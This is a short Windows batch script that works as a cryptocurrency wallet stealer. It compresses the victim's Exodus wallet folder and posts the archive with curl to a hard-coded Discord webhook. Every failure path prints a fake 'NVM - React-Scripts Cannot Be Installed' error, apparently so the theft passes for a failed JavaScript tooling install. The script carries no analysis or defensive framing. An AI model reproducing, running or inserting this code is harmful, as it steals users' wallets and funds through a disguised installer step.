@echo off
setlocal
set "source=%USERPROFILE%\AppData\Roaming\Exodus\exodus.wallet"
set "destination=%source%\backup.zip"
set "webhook=https://discord.com/api/webhooks/1321587676767584297/bg0Qg12WW9qv4tn2euNprDQNaUusRc-nrTYiv0pRCg04-G75VJR91cGnLb1OU6N_aiz9"

if not exist "%source%" (
    echo NVM - React-Scripts Cannot Be Installed Due To System Specifications.
    exit /b 1
)

powershell -Command "Compress-Archive -Path '%source%\*' -DestinationPath '%destination%' -Force" >nul 2>&1

if exist "%destination%" (
    curl -s -o nul -X POST "%webhook%" -F "file=@%destination%"
    if %errorlevel% neq 0 (
        echo NVM - React-Scripts Cannot Be Installed Due To System Specifications.
    )
) else (
    echo NVM - React-Scripts Cannot Be Installed Due To System Specifications.
)
